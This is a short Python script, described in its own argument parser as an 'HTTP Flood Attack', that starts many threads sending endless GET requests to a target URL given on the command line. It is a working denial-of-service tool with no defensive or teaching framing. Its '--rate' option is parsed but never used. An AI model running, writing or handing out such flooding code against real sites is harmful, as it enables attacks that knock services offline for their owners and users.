import requests
import argparse
import threading

def http_flood(target_url, threads, rate=1000):
    def flood():
        while True:
            try:
                requests.get(target_url)
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=flood).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Flood Attack")
    parser.add_argument("target_url", help="Target URL")
    parser.add_argument("threads", type=int, help="Number of threads to use")
    parser.add_argument("--rate", type=int, default=1000, help="Rate of requests per second")
    args = parser.parse_args()

    http_flood(args.target_url, args.threads, args.rate)